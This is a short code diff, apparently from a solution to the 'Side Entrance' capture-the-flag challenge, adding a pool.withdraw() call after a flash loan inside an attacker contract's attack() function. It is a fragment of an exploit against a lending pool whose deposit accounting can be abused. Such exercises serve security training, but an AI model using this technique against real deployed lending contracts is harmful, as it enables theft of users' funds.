@@ -7,6 +7,6 @@
     SideEntranceLenderPool pool;
     function attack() external {
         pool.flashLoan(address(pool).balance);
-        
+        pool.withdraw();
     }
  }
